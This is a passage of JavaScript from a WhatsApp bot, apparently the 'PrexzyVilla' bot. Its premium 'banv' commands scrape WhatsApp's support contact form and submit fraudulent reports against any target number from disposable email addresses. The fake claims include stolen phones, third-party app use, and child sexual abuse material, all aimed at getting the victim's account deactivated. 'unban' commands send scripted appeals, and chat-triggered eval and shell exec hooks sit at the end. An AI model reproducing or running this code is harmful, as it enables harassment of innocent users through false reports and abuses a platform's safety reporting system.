let axioss = require("axios")  
let prexzyxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = prexzyxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(prexzyxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", prexzynumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Hello, please deactivate this number, because I have lost my cellphone and someone is using my number, please deactivate my number")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
PrexzyVilla.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'banv2': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return replygcprexzy(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
let prexzynumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let prexzytesx = await PrexzyVilla.onWhatsApp(prexzynumx)
if (prexzytesx.length == 0) return replygcprexzy(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let prexzyxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = prexzyxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(prexzyxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", prexzynumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Porfavor, desative o número da minha conta, o chip e os documentos foram roubados essa conta possuí dados importante, então, por favor desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
PrexzyVilla.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'banv3': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return replygcprexzy(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
let prexzynumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let prexzytesx = await PrexzyVilla.onWhatsApp(prexzynumx)
if (prexzytesx.length == 0) return replygcprexzy(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let prexzyxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = prexzyxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(prexzyxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", prexzynumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/Roubado: Por favor, desative minha conta\n\nOlá, por favor desative este número, pois perdi meu celular e alguém está usando meu número, por favor desative meu número")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
PrexzyVilla.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'banv4': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return replygcprexzy(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
let prexzynumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let prexzytesx = await PrexzyVilla.onWhatsApp(prexzynumx)
if (prexzytesx.length == 0) return replygcprexzy(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let prexzyxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = prexzyxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(prexzyxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", prexzynumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "UM DE SEUS USUÁRIOS, ESTA USANDO O APK DO WHATSAPP FEITO POR TERCEIROS E ESTA INDO CONTRA OS TERMOS DE SERVIÇO PEÇO QUE ANALISEM ESSE USUÁRIO")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
PrexzyVilla.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'banv5': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return replygcprexzy(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
prexzynumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let prexzytesx = await PrexzyVilla.onWhatsApp(prexzynumx)
if (prexzytesx.length == 0) return replygcprexzy(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let prexzyxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = prexzyxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(prexzyxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", prexzynumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "مرحبًا ، يرجى إلغاء تنشيط هذا الرقم ، لأنني فقدت هاتفي وشخص ما يستخدم رقمي ، يرجى إلغاء تنشيط رقمي")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
PrexzyVilla.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'banv6': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return replygcprexzy(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
let prexzynumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let prexzytesx = await PrexzyVilla.onWhatsApp(prexzynumx)
if (prexzytesx.length == 0) return replygcprexzy(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let prexzyxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = prexzyxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(prexzyxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", prexzynumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Esse número vem fazendo discurso ao ódio e divulgado conteúdo de porno infantil Numero")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
PrexzyVilla.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'unbanv1': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return replygcprexzy(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
let prexzynumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let prexzytesx = await PrexzyVilla.onWhatsApp(prexzynumx)
if (prexzytesx.length == 0) return replygcprexzy(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let prexzyxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = prexzyxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(prexzyxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", prexzynumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Hello WhatsApp team, recently my WhatsApp number was suddenly blocked and I couldnt log into my account, in my account there is an important group like a school group and I have to read it but the account My WhatsApp is suddenly blocked, please restore my numbers")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
PrexzyVilla.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'unbanv2': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return replygcprexzy(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
let prexzynumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let prexzytesx = await PrexzyVilla.onWhatsApp(prexzynumx)
if (prexzytesx.length == 0) return replygcprexzy(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let prexzyxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = prexzyxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(prexzyxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", prexzynumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Equipe, o sistema de vocês baniram meu número por engano. Peço que vocês reativem meu número pois tenho família em outro país e preciso me comunicar com eles")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
PrexzyVilla.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'unbanv3': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return replygcprexzy(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
let prexzynumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let prexzytesx = await PrexzyVilla.onWhatsApp(prexzynumx)
if (prexzytesx.length == 0) return replygcprexzy(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let prexzyxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = prexzyxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(prexzyxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", prexzynumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Kepada pihak WhatsApp yang bijak Sana kenapa akun WhatsApp saya terblokir padahal aktifitas WhatsApp messenger saya normal normal saja mohon dibukakan kembali akun WhatsApp saya dengan ini saya cantumkan kode nomor akun WhatsApp messenger saya sekian banyak Terimakasih")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
PrexzyVilla.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'unbanv4': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return replygcprexzy(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
let prexzynumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let prexzytesx = await PrexzyVilla.onWhatsApp(prexzynumx)
if (prexzytesx.length == 0) return replygcprexzy(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let prexzyxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = prexzyxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(prexzyxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", prexzynumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "مرحبًا whatsapp ، تم حظر حسابي بشكل دائم أو مؤقت ، يرجى إلغاء حظر حسابي\nالرقم")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
PrexzyVilla.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'unbanv5': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return replygcprexzy(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
let prexzynumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let prexzytesx = await PrexzyVilla.onWhatsApp(prexzynumx)
if (prexzytesx.length == 0) return replygcprexzy(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let prexzyxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = prexzyxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(prexzyxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", prexzynumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Halo pak, Akun Whatsapp Saya diblokir Saya Maaf Saya Telah Menginstal Aplikasi Pihak Ketiga Secara Tidak Sengaja. Harap Buka Blokir Akun Saya Sesegera Mungkin. Terimakasih")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
PrexzyVilla.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
            
            default:
                if (budy.startsWith('=>')) {
                    if (!PrexzyTheCreator) return PrexzyStickOwner()
                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                        if (sat == undefined) {
                            bang = util.format(sul)
                        }
                        return replygcprexzy(bang)
                    }
                    try {
                        replygcprexzy(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        replygcprexzy(String(e))
                    }
                }

                if (budy.startsWith('>')) {
                    if (!PrexzyTheCreator) return PrexzyStickOwner()
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await replygcprexzy(evaled)
                    } catch (err) {
                        await replygcprexzy(String(err))
                    }
                }
                if (budy.startsWith('$')) {
                    if (!PrexzyTheCreator) return PrexzyStickOwner()
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return replygcprexzy(err)
                        if (stdout) return replygcprexzy(stdout)
                    })
                }
                if (isCmd && budy.toLowerCase() != undefined) {
if (m.chat.endsWith('broadcast')) return
if (m.isBaileys) return
let msgs = global.db.data.database
if (!(budy.toLowerCase() in msgs)) return
PrexzyVilla.copyNForward(m.chat, msgs[budy.toLowerCase()], true, {quoted: m})
}
            }
    } catch (err) {
        console.log(util.format(err))
        let e = String(err)
PrexzyVilla.sendMessage("123123@s.whatsapp.net", { text: "Hello developer, there seems to be an error, please fix it " + util.format(e), 
contextInfo:{
forwardingScore: 9999999, 
isForwarded: true
}})
if (e.includes("conflict")) return
if (e.includes("not-authorized")) return
if (e.includes("already-exists")) return
if (e.includes("rate-overlimit")) return
if (e.includes("Connection Closed")) return
if (e.includes("Timed Out")) return
if (e.includes("Value not found")) return
if (e.includes("Socket connection timeout")) return
    }
}
